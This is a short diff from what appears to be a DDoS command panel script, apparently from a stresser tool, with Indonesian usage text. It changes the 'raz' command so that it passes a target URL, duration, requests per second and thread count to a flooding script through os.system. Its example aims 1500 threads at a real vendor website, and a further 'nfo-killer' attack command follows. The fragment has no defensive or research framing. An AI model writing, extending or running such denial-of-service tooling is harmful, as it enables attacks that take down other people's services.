@@ -341,12 +341,13 @@ def main():
         elif "raz" in cnc:
             try:
                 target = cnc.split()[1]
-                threads = cnc.split()[2]
-                time = cnc.split()[3]
-                os.system(f'python3 url.py {target} {threads} {time}')
+                time = cnc.split()[2]
+                rate = cnc.split()[3]
+                threads = cnc.split()[4]
+                os.system(f'python3 url.py {target} {time} {rate} {threads}')
             except IndexError:
-                print('Usage: raz <web> <threads> <waktu>')
-                print('Example: raz https://mikrotik.com 5000 60')
+                print('Usage: raz <web> <waktu> <rps> <threads>')
+                print('Example: raz https://mikrotik.com 60 80 1500')
 
         elif "nfo-killer" in cnc:
             try:
